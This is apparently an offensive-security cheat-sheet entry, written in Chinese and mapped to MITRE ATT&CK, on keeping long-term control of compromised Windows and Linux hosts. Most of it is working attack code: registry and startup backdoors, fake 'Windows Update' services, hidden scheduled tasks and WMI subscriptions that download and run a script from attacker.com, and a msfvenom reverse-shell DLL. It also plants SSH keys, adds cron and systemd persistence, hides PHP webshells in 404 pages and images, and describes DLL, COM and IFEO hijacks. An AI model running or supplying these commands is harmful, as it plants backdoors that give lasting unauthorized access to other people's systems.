---
id: 07-001
title: "🔐 持久化 - 长期控制 (Persistence - Long-term Access)"
category: 持久化
category_en: Persistence
difficulty: ★★★
tools: "MSF Venom, Cobalt Strike, 计划任务, 自启动项"
last_updated: 2025-07
tags: ["persistence", "bootkit", "startup-autostart", "account-persistence"]
subdomain: persistence
nist_csf: ["PR.AC-01", "DE.CM-01"]
mitre_attack: ["T1543", "T1547", "T1136", "T1053"]
---
# 🔐 持久化 - 长期控制 (Persistence - Long-term Access)

## 概述
在目标系统上建立持久化后门，确保在系统重启、凭证更改后仍能维持访问控制权。

## 核心技能

### 1. Windows启动项持久化

```powershell
# 注册表Run键
# Current User
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\System32\rundll32.exe C:\Windows\Temp\backdoor.dll,#1"
# Local Machine (需要管理员)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"

# 启动文件夹
# User Startup
$startup = [Environment]::GetFolderPath("Startup")
Copy-Item "C:\Temp\payload.exe" "$startup\svchost.exe"

# All Users Startup
Copy-Item "C:\Temp\payload.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\svchost.exe"

# RunOnce
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"

# 使用PowerShell创建启动项
$WScript = New-Object -ComObject "WScript.Shell"
$Shortcut = $WScript.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Update.lnk")
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-WindowStyle Hidden -Exec Bypass -File C:\Users\Public\script.ps1"
$Shortcut.Save()
```

### 2. Windows服务持久化

```powershell
# 创建恶意服务
sc create "WindowsUpdateService" binpath= "cmd.exe /c C:\Windows\Temp\payload.exe" start= auto
sc description "WindowsUpdateService" "Provides Windows Update services"
sc start "WindowsUpdateService"

# 使用PowerShell
New-Service -Name "WinUpdateSvc" -DisplayName "Windows Update Service" -BinaryPathName "C:\Windows\Temp\payload.exe" -StartupType Automatic
Start-Service -Name "WinUpdateSvc"

# 修改现有服务
# 将合法服务的binpath替换为后门
sc config "TrustedInstaller" binpath= "C:\Windows\Temp\payload.exe"

# 服务隐藏技术
# 使用SDDL隐藏服务（拒绝查询权限）
sc sdset ServiceName "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
```

### 3. Windows计划任务持久化

```powershell
# 创建计划任务
# 每分钟执行
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoLogo -NonInteractive -Command `"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')`""
$trigger = New-ScheduledTaskTrigger -Daily -At 3am
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateTask" -Action $action -Trigger $trigger -Principal $principal -Settings $settings

# 系统启动时执行
$trigger = New-ScheduledTaskTrigger -AtStartup

# 用户登录时执行
$trigger = New-ScheduledTaskTrigger -AtLogOn

# 空闲时执行
$trigger = New-ScheduledTaskTrigger -AtIdle

# 使用schtasks
schtasks /create /tn "MicrosoftEdgeUpdate" /tr "powershell.exe -WindowStyle Hidden -Enc BASE64" /sc MINUTE /mo 5 /ru SYSTEM
schtasks /create /tn "SystemCheck" /tr "C:\Windows\Temp\payload.exe" /sc ONSTART /ru SYSTEM
```

### 4. Linux持久化

```bash
# SSH密钥持久化
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# 添加root SSH密钥（需要root）
echo "ssh-rsa AAAAB3NzaC1yc2EAAA..." >> /root/.ssh/authorized_keys

# Cron持久化
# 用户crontab
(crontab -l 2>/dev/null; echo "*/5 * * * * /path/to/payload.sh") | crontab -

# 系统cron
echo "*/10 * * * * root /path/to/payload.sh" >> /etc/crontab

# crond目录
echo '#!/bin/bash' > /etc/cron.hourly/update.sh
echo '/path/to/payload.sh' >> /etc/cron.hourly/update.sh
chmod +x /etc/cron.hourly/update.sh

# 启动脚本持久化
# init.d (SysV)
cp payload /etc/init.d/update
update-rc.d update defaults

# systemd服务
cat > /etc/systemd/system/update.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/path/to/payload.sh
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

systemctl enable update.service
systemctl start update.service

# .bashrc / .profile 持久化
echo '/path/to/payload.sh &' >> ~/.bashrc
echo '(nohup /path/to/payload.sh >/dev/null 2>&1 &)' >> ~/.profile
```

### 5. WebShell持久化

```php
<!-- 隐蔽PHP WebShell -->
<?php
// shell.php - 隐藏在合法文件中
$cmd = $_SERVER['HTTP_X_CMD'];
if ($cmd) {
    system($cmd);
}
?>

<!-- 使用404页面作为后门 -->
<!-- 修改404.php -->
<?php
$cmd = $_GET['cmd'] ?? ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? '');
if ($cmd) {
    system($cmd);
}
?>

<!-- 图片马后门 -->
<!-- 在图片中隐藏 -->
<?php
$img = imagecreatefromjpeg('legitimate.jpg');
$payload = '/*<?php system($_GET["cmd"]);?>*/';
// 将payload注入到图片中
?>

<!-- 多个备份 -->
<!-- 在多个位置部署WebShell -->
# 使用nibbleblog等CMS的后门
```

### 6. DLL劫持持久化

```powershell
# 查找缺失的DLL（使用Process Monitor）
# 过滤: Process Name 包含目标程序
# 过滤: Path 包含 .dll
# 过滤: Result 为 NAME NOT FOUND
# 从可写路径加载的DLL可被劫持

# 创建恶意DLL
# MSFVenom生成
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f dll -o malicious.dll

# 或手动创建
# dllmain.cpp:
# #include <windows.h>
# BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
#     switch (ul_reason_for_call) {
#         case DLL_PROCESS_ATTACH:
#             system("powershell -W Hidden -Enc BASE64");
#             break;
#     }
#     return TRUE;
# }

# 编译: x86_64-w64-mingw32-gcc -shared -o hijack.dll dllmain.cpp

# 常用劫持DLL
# - wlbsctrl.dll (Windows)
# - UXTheme.dll
# - dbghelp.dll
# - rpcrtremote.dll
# - 应用程序缺失的任何DLL

# 将恶意DLL放置在应用程序目录
copy malicious.dll "C:\Program Files\TargetApp\missing.dll"
```

### 7. 高级持久化技术

```powershell
# 注册表COM劫持
# 将CLSID重定向到恶意DLL
reg add "HKCR\CLSID\{GUID}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\Temp\malicious.dll"

# Image File Execution Options (IFEO)
# 调试器劫持 - 当notepad.exe运行时执行payload
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\payload.exe"

# AppInit_DLLs
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\Windows\Temp\malicious.dll"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1

# NSSM (Non-Sucking Service Manager) - 将任意程序注册为服务
nssm install MyService "C:\path\to\payload.exe"
nssm start MyService

# WMI事件订阅持久化
# 创建一个永久WMI事件，在特定条件下执行
powershell -Exec Bypass << 'EOF'
$filterArgs = @{name='ProcessFilter'; EventNameSpace='root\cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'"}
$filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs

$consumerArgs = @{name='Consumer'; CommandLineTemplate="powershell.exe -WindowStyle Hidden -Command `"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')`""}
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $consumerArgs

$bindingArgs = @{Filter=$filter; Consumer=$consumer}
$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments $bindingArgs
EOF
```

## 持久化技术对比

| 技术 | 隐蔽性 | 持久性 | 检测难度 | 管理员权限 |
|:---|:---:|:---:|:---:|:---:|
| 注册表Run键 | 低 | 中 | 低 | 否 |
| Startup文件夹 | 低 | 中 | 低 | 否 |
| 服务持久化 | 中 | 高 | 中 | ✅ |
| 计划任务 | 中 | 高 | 中 | ✅ |
| 驱动/内核 | 高 | 极高 | 高 | ✅ |
| WMI事件 | 高 | 高 | 高 | ✅ |
| DLL劫持 | 中 | 中 | 中 | 不一定 |
| SSH密钥 | 高 | 高 | 中 | 否 |
| WebShell | 高 | 高 | 中 | 不一定 |

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| SharPersist | Windows持久化工具 | https://github.com/fireeye/SharPersist |
| PwnStar | MSF持久化模块 | https://github.com/SecWiki/windows-kernel-exploits |
| PowerSploit | 持久化模块 | https://github.com/PowerShellMafia/PowerSploit |
| NSSM | 服务管理 | https://nssm.cc/ |
| Weevely | PHP WebShell | https://github.com/epinna/weevely3 |
| Koadic | PowerShell持久化 | https://github.com/zerosum0x0/koadic |

## 参考资源
- [MITRE ATT&CK - Persistence](https://attack.mitre.org/tactics/TA0003/)
- [HackTricks - Persistence](https://book.hacktricks.xyz/windows-hardening/stealth-persistence)
- [PayloadsAllTheThings - Persistence](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Persistence)
- [ODS - Persistence Methods](https://oddvar.moe/2018/03/21/persistence-methods-for-red-teams/)
